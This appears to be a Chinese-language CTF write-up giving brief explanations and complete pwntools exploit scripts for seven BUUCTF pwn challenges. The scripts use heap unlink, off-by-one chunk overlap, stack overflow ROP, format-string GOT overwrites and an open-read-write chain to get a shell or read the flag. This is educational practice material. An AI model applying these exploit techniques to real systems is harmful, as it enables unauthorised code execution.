@[toc]
# buu073-hitcontraining_bamboobox
数据结构：
![](https://img-blog.csdnimg.cn/d99f16a105794f47aec93a1ea9a3db5f.png)
共可申请100个结构，其中change_item函数有任意长度堆溢出漏洞。
![在这里插入图片描述](https://img-blog.csdnimg.cn/72907531dc174ac0a71c3acee836b772.png)
本题程序加载地址固定，itemlist地址固定，因此考虑使用unlink方法解题。
![在这里插入图片描述](https://img-blog.csdnimg.cn/d858dce877a145c588d755fa3719a302.png)
unlink之后可以直接通过第一个chunk读取到stdin的地址，从而获取libc加载基址。
需要注意的是这里修改的是atoi函数的got表地址，如果修改free函数的got表地址，由于输入时程序会将输入的后面一个字节清零，会导致free函数got表后面的一个地址（puts）发生错误，使得menu函数调用puts函数失败。而atoi后面是exit函数地址，无关紧要。

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29731)
elf = ELF('./pwn')

def add(length, content):
    io.sendlineafter(b'Your choice:', b'2')
    io.sendlineafter(b'Please enter the length of item name:', str(length).encode())
    io.sendafter(b'Please enter the name of item:', content)

def show():
    io.sendlineafter(b'Your choice:', b'1')

def change(index, length, content):
    io.sendlineafter(b'Your choice:', b'3')
    io.sendlineafter(b'Please enter the index of item:', str(index).encode())
    io.sendlineafter(b'Please enter the length of item name:', str(length).encode())
    io.sendafter(b'Please enter the new name of the item:', content)

def delete(index):
    io.sendlineafter(b'Your choice:', b'4')
    io.sendlineafter(b'Please enter the index of item:', str(index).encode())

add(0x88, b'colin')     # chunk #0
add(0x88, b'colin')     # chunk #1
add(0x20, b'/bin/sh')   # chunk #2
payload = p64(0x10)
payload += p64(0x81)
payload += p64(0x6020C8 - 0x18)
payload += p64(0x6020C8 - 0x10)
payload += cyclic(0x60)
payload += p64(0x80)
payload += p64(0x90)
change(0, 0x90, payload)
delete(1)
show()
io.recv(4)
stdin = u64(io.recv(6) + b'\x00\x00')
print(hex(stdin))
libc = LibcSearcher('_IO_2_1_stdin_', stdin)
base = stdin - libc.dump('_IO_2_1_stdin_')
sys = base + libc.dump('system')
change(0, 0x20, p64(stdin) + p64(0) + p64(0x88) + p64(elf.got['atoi']))
change(0, 0x8, p64(sys))
io.sendline(b'/bin/sh')
io.interactive()
```

# buu074-cmcc_pwnme2
简单的栈溢出，题目给的拼接字符串的函数里面的路径是错的，不需要用，直接输出got表然后get shell即可。

```py
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process("./pwnme2")
io = remote("node4.buuoj.cn", 29174)
elf = ELF("./pwnme2")

payload = cyclic(0x70)
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

io.sendlineafter('Please input:', payload)
io.recvuntil(b'Hello')
io.recvuntil(b'\n')
puts = u32(io.recv(4))
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print(hex(binsh))

payload = cyclic(0x70)
payload += p32(system)
payload += p32(elf.symbols['main'])
payload += p32(binsh)
io.sendlineafter('Please input:', payload)

io.interactive()
```

# buu075-picoctf_2018_got-shell
在修改后还调用了puts函数，因此只需要将puts函数的got表内容改成win函数地址即可。

```py
from pwn import *
context.log_level = 'debug'
# io = process('./PicoCTF_2018_got-shell')
io = remote('node4.buuoj.cn', 27364)
elf = ELF('./PicoCTF_2018_got-shell')
target = elf.got['puts']
value = elf.symbols['win']

io.sendlineafter(b'value?\n', hex(target)[2:].encode())
io.sendlineafter(hex(target)[2:].encode(), hex(value)[2:].encode())

io.interactive()
```

# buu076-npuctf_2020_easyheap
增删改查四个功能，其中增加只能增加大小为0x20或0x40的堆块。改功能有off by one漏洞。

本题环境是2.27，因此释放的堆块都会在tcache中保存。而要想tcache中的堆块被重新分配，其大小就必须是0x20或0x40。如果使用off by one漏洞修改一个堆块的size，则必须在其正在使用时修改，否则当堆块释放时修改大小，在重新分配时无法通过检查。至于大小的修改，有两种可能：改大或改小。

如果改大，则只能从0x20改为0x40，修改后的大小如果不为0x40，在释放后将无法被重新分配。如果改小，可以从0x40改为0x20，后面的部分由于可以控制，因此可以伪造成一个假chunk。

这里选择的是<font color=red>**改大**</font>。如何改？首先想象这样的堆排布：三个0x20的chunk，前面2个都是用作buffer，后面一个用于heaparray结构，现在通过edit第1个chunk将第2个chunk的大小改成0x40，再释放第2、3个chunk，就会产生chunk重叠，之后再重新分配回来，就可以通过edit随意修改heaparray中的指针，进而实现任意地址写。本题中最方便的就是改到free的got表位置，通过show获取libc地址，然后将这里的值改成system函数地址，直接delete即可get shell。

```py
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process("npuctf_2020_easyheap")
io = remote('node4.buuoj.cn', 29065)
elf = ELF("npuctf_2020_easyheap")

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def create_heap(size, content):
	sla(b'Your choice :', b'1')
	sla(b'Size of Heap(0x10 or 0x20 only) : ', str(size).encode())
	sla(b'Content:', content)
	
def edit_heap(index, content):
	sla(b'Your choice :', b'2')
	sla(b'Index :', str(index).encode())
	sla(b'Content: ', content)

def show_heap(index):
	sla(b'Your choice :', b'3')
	sla(b'Index :', str(index).encode())
	
def delete_heap(index):
	sla(b'Your choice :', b'4')
	sla(b'Index :', str(index).encode())

create_heap(0x18, cyclic(0x38))	# 0
create_heap(0x18, cyclic(0x18))	# 1
create_heap(0x18, cyclic(0x18))	# 2
delete_heap(0)
edit_heap(1, b'/bin/sh'.ljust(0x18, b'\x00') + p8(0x41))
delete_heap(2)
create_heap(0x38, b'/bin/sh'.ljust(0x18, b'\x00') + p64(0x21) + p64(0x38) + p64(elf.got['free']))
show_heap(0)
io.recvuntil(b'Content : ')
free = u64(io.recv(6) + b'\x00\x00')
print(hex(free))
libc = LibcSearcher('free', free)
base = free - libc.dump('free')
print(hex(base))
system = base + libc.dump('system')
edit_heap(0, p64(system))
delete_heap(1)
io.interactive()
```

# buu077-wdb_2018_2nd_easyfmt
这题在bugku上也有，好像是叫pwn07，简单的格式化字符串漏洞，不多解释了。
```py
from pwn import *
from LibcSearcher import *
context(arch='i386', os='linux', log_level='debug')

elf = ELF('./pwn')

io = remote('node4.buuoj.cn', 29596)
# io = process('./pwn')
io.recvuntil(b'Do you know repeater?\n')

payload1 = p32(elf.got['read']) + b'%6$s'
io.send(payload1)

mem_read_addr = u32(io.recv()[4:8])

libc = LibcSearcher('read', mem_read_addr)
libc_base = mem_read_addr - libc.dump('read')
mem_sys_addr = libc_base + libc.dump('system')
mem_printf_addr = libc_base + libc.dump('printf')

payload2 = fmtstr_payload(6, {elf.got['printf']: mem_sys_addr}, write_size = 'byte')
io.send(payload2)
io.interactive()	# choose 3rd of libc
```

# buu078-PicoCTF_2018_can-you-gets-me
静态编译的32位程序，没有system函数和字符串/bin/sh，因此通过orw方式读取flag。
```py
from pwn import *
context.log_level = 'debug'

# io = process('./PicoCTF_2018_can-you-gets-me')
io = remote('node4.buuoj.cn', 27340)
elf = ELF('./PicoCTF_2018_can-you-gets-me')

pop4 = 0x809d6f4
write_addr = 0x80EBD20

payload = cyclic(0x18 + 4)
payload += p32(elf.symbols['read'])
payload += p32(pop4)
payload += p32(0)
payload += p32(write_addr)
payload += p32(5)
payload += p32(0)
payload += p32(elf.symbols['open'])
payload += p32(pop4)
payload += p32(write_addr)
payload += p32(0) * 3
payload += p32(elf.symbols['read'])
payload += p32(pop4)
payload += p32(3)
payload += p32(write_addr)
payload += p32(0x30)
payload += p32(0)
payload += p32(elf.symbols['write'])
payload += p32(0)
payload += p32(1)
payload += p32(write_addr)
payload += p32(0x30)

io.sendlineafter(b'GIVE ME YOUR NAME!', payload)
time.sleep(0.5)
io.sendline(b'/flag')
io.interactive()
```

# buu079-mrctf2020_easy_equation
简单的格式化字符串漏洞。
```py
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

sol = 2
# io = process('./mrctf2020_easy_equation')
io = remote('node4.buuoj.cn', 25629)
elf = ELF('./mrctf2020_easy_equation')

# gdb.attach(io)
# time.sleep(3)
payload = b'a%1c%10$hhnaaaaba' + p64(0x60105C)
print(payload)
io.sendline(payload)
io.interactive()
```
